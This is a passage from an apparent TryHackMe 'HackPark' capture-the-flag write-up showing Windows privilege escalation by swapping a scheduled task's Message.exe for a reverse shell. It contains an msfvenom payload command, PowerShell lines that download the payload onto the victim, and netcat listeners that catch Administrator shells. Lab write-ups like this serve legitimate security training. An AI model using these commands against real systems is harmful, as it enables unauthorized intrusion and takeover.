+</code></pre><p>In Metasploit:</p><ul><li>Background the current channel</li></ul><pre><code class=language-sh>c:\Program Files (x86)\SystemScheduler&gt;^Z
+Background channel 8? [y/N]  y
+meterpreter &gt; pwd
+c:\Program Files (x86)\SystemScheduler
+</code></pre><ul><li>Rename Message.exe to Message.exe.bak</li></ul><pre><code class=language-sh>meterpreter &gt; mv Message.exe Message.exe.bak
+</code></pre><ul><li>Rename shell.exe to Message.exe</li></ul><pre><code class=language-sh>meterpreter &gt; mv shell.exe Message.exe
+</code></pre><ul><li>Background the current session <code>ctrl + z</code>
+and run the previous <code>multi/handler</code> again</li></ul><pre><code class=language-sh>meterpreter &gt;
+Background session 1? [y/N]  y
+[-] Unknown command: y.
+msf5 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.219.52:9001
+</code></pre><p>Within 30 seconds WindowsScheduler will run <code>Message.exe</code> that was replaced by our venomous <code>shell.exe</code>.
+As the task is executed as <code>Administrator</code> a reverse shell with corresponding permissions will be established.</p><pre><code class=language-sh>[*] Sending stage (176195 bytes) to 10.10.75.91
+[*] Meterpreter session 2 opened (10.10.219.52:9001 -&gt; 10.10.75.91:49304) at 2021-04-18 11:30:01 +0000
+
+meterpreter &gt; getuid
+Server username: HACKPARK\Administrator
+</code></pre><p>Congrats! You have root.</p><h2 id=task-5-wo-metasploit>Task 5 (w/o Metasploit)<a href=#task-5-wo-metasploit class=anchor aria-hidden=true>#</a></h2><p>Use same exploit to gain initial reverse shell. Setup a netcat listener <code>nc -lvnp 4445</code>.</p><pre><code class=language-sh>root@kali:~/Desktop/HackPark# nc -lvnp 4445
+listening on [any] 4445 ...
+</code></pre><p>Use the browser to establish the initial reverse shell.<br><code>http://&lt;target ip>/admin/app/editor/editpost.cshtml</code></p><pre><code class=language-sh>listening on [any] 4445 ...
+connect to [10.10.219.52] from (UNKNOWN) [10.10.75.91] 49313
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+</code></pre><h3 id=compromise-the-machine-1>Compromise the machine<a href=#compromise-the-machine-1 class=anchor aria-hidden=true>#</a></h3><p>The target is to root by using <code>windows/shell_reverse_tcp</code> (instead of meterpreter which was used in Task 4).
+Create a venomous <code>shell.exe</code> with different payload.</p><pre><code class=language-bash>root@kali:~/Desktop/HackPark# msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.10.219.52 LPORT=9001 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] Skipping invalid encoder /x86/shikata_ga_nai
+[!] Couldn't find encoder to use
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
+</code></pre><p>Move file to target
+A simple http.server will serve for this</p><p>On your attacker machine:</p><pre><code class=language-sh>root@kali:~/Desktop/HackPark# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre><h3 id=root-the-machine-1>Root the machine<a href=#root-the-machine-1 class=anchor aria-hidden=true>#</a></h3><p>Switch to the victims machine and change current directory to <code>c:\Program Files (x86)\SystemScheduler</code>.</p><pre><code class=language-sh>cd c:\Program Files (x86)\SystemScheduler
+</code></pre><p>Download generated <code>shell.exe</code> and <code>winPEAS.bat</code> onto victim machine.</p><pre><code class=language-sh>powershell -c &quot;Invoke-WebRequest -Uri 'http://&lt;webserver ip&gt;:8000/shell.exe' -OutFile 'shell.exe'&quot;
+powershell -c &quot;Invoke-WebRequest -Uri 'http://&lt;webserver ip&gt;:8000/winPEAS.bat' -OutFile 'winPEAS.bat'&quot;
+</code></pre><p>Start a netcat listener on your machine. For better stability I used <code>rlwrap</code> around.</p><pre><code class=language-sh>root@kali:~/Desktop/HackPark# rlwrap nc -lvnp 9001
+listening on [any] 9001 ...
+</code></pre><p>Rename <code>Message.exe</code></p><pre><code class=language-sh>ren &quot;Message.exe&quot; &quot;Message.exe.bak&quot;
+c:\Program Files (x86)\SystemScheduler&gt;ren &quot;Message.exe&quot; &quot;Message.exe.bak&quot;
+</code></pre><p>Finally rename the uploaded shell.exe on target machine to <code>Message.exe</code></p><pre><code class=language-sh>ren &quot;shell.exe&quot; &quot;Message.exe&quot;
+c:\Program Files (x86)\SystemScheduler&gt;ren &quot;shell.exe&quot; &quot;Message.exe&quot;
+</code></pre><p>Wait for WindowsScheduler to run our new <code>Message.exe</code></p><pre><code class=language-sh>root@kali:~# rlwrap nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.219.52] from (UNKNOWN) [10.10.181.219] 49214
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\PROGRA~2\SYSTEM~1&gt;echo %username%
+echo %username%
+Administrator
+</code></pre><p>Congrats! You have root.</p><div class="docs-navigation d-flex justify-content-between"><a href=https://www.xuptox.org/docs/tryhackme/gamezone/><div class="card my-1"><div class="card-body py-2">&larr; GameZone</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Happy Hacking!</li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline><li class=list-inline-item><a href=https://www.xuptox.org/privacy-policy/>Privacy Policy</a></li></ul></div></div></div></footer><script src=https://www.xuptox.org/js/highlight.min.e9108a0b3c03958002f9650a02a3c3dcc2c69459b908c8440f7d2ad360aa0f216c0023ba6192f82a8bdbd996bd314e1e0cff114a8f54a0166630560d0be8ede7.js integrity="sha512-6RCKCzwDlYAC+WUKAqPD3MLGlFm5CMhED30q02CqDyFsACO6YZL4Kovb2Za9MU4eDP8RSo9UoBZmMFYNC+jt5w==" crossorigin=anonymous defer></script><script src=https://www.xuptox.org/main.min.7ab523108435955765bcb88a0ee704f412ba01646b5478e84f3b9feb24f0ce750a14c3f7bd9a62408fe21e41996d361a9eb29f77e85dfe77b7e17f7623bd3a97.js integrity="sha512-erUjEIQ1lVdlvLiKDucE9BK6AWRrVHjoTzuf6yTwznUKFMP3vZpiQI/iHkGZbTYanrKfd+hd/ne34X92I706lw==" crossorigin=anonymous defer></script><script src=https://www.xuptox.org/index.min.d075926e6ee81469c7523c3ee6aae47745557a2ddb95fc3a804114db4c77e71367b427dc0ee0a878dcdcee86ec521fd0034ab468a29bd285956931d205792b38.js integrity="sha512-0HWSbm7oFGnHUjw+5qrkd0VVei3blfw6gEEU20x35xNntCfcDuCoeNzc7obsUh/QA0q0aKKb0oWVaTHSBXkrOA==" crossorigin=anonymous defer></script></body></html>
